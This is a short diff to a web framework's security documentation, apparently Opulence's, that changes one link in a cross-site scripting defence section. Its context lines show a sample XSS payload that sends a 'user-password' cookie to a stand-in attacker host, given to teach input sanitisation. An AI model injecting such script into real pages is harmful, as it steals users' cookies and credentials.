@@ -70,7 +70,7 @@ Hello, <script>(new Image).src="http://attacker-site.com/" + $.cookie("user-pass
 Loading this page would send the user's "user-password" cookie to the attacker's server.
 
 <h4 id="css-how-to-defend-against-it">How to Defend Against It</h4>
-To solve this problem you must sanitize any user-input before displaying it on a page.  [Opulence's template system](view-basics#cross-site-scripting) gives you the tools to prevent cross-site scripting.
+To solve this problem you must sanitize any user-input before displaying it on a page.  [Opulence's template system](view-fortune#sanitized-tags) gives you the tools to prevent cross-site scripting.
 
 <h2 id="cross-site-request-forgery">Cross-Site Request Forgery (CSRF/XSRF)</h2>
 <h4 id="csrf-what-is-it">What is It?</h4>
